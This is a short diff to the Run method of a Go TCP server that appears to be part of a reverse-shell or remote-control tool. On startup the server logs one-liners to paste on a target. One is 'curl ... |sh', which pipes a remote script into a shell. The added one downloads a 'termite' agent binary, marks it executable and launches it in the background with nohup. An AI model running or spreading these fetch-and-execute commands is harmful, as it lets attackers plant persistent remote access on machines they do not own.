@@ -203,8 +203,20 @@ func (s *TCPServer) Run() {
 	}
 	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))
 
-	for _, ifname := range s.Interfaces {
-		log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
+	if s.Encrypted {
+		for _, ifname := range s.Interfaces {
+			for _, ifaddr := range Ctx.Distributor.Interfaces {
+				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.Port)
+				listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
+				filename := str.RandomString(0x08)
+				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
+				log.Warn("\t`%s`", command)
+			}
+		}
+	} else {
+		for _, ifname := range s.Interfaces {
+			log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
+		}
 	}
 
 	for {
